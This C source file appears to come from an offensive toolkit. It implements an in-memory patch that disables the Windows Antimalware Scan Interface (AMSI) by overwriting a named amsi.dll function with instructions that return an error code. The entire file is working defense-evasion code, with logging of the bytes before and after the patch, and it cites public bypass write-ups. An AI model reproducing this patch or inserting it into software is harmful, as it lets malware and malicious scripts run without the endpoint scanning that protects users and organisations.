#include "Box.h"

// https://rastamouse.me/memory-patching-amsi-bypass/
// https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-amsi-x64.c

BOOL PatchAmsi
(
	IN LPCSTR AmsiApi
)

{

	DWORD dwOldProt = 0;
	PBYTE AmsiFunc  = NULL;

	BYTE patch[] = {
		0xB8, 0x57, 0x00, 0x07, 0x80 // mov eax, 0x80070057
		,0xC3 // ret
	};

	HMODULE amsi = LoadLibraryA("amsi.dll");
	if (!amsi)
	{
		PRINT_ERROR("LoadLibraryA");
		return FALSE;
	}

	INFO("[0x%p] Current Amsi Handle", amsi);

	AmsiFunc = (PBYTE)GetProcAddress(amsi, AmsiApi);
	if (!AmsiFunc)
	{
		PRINT_ERROR("GetProcAddress");
		return FALSE;
	}

	INFO("[0x%p] Handle for %s", AmsiFunc, AmsiApi);

	printf("[*] AmsiFunc first 6 bytes before:\n");
	for (int i = 0; i < 6; i++)
		printf("  %02X", AmsiFunc[i]);
	printf("\n");

	if (!VirtualProtect(AmsiFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	INFO("Change Allocations for %s --> PAGE_EXECUTE_READWRITE [RWX]", AmsiApi);

	memcpy(AmsiFunc, patch, sizeof(patch));

	if (!VirtualProtect(AmsiFunc, sizeof(patch), dwOldProt, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtect");
		return FALSE;
	}

	printf("[*] AmsiFunc first 6 bytes after:\n");
	for (int i = 0; i < 6; i++)
		printf("  %02X", AmsiFunc[i]);
	printf("\n");

	OKAY("DONE!");

	return TRUE;
}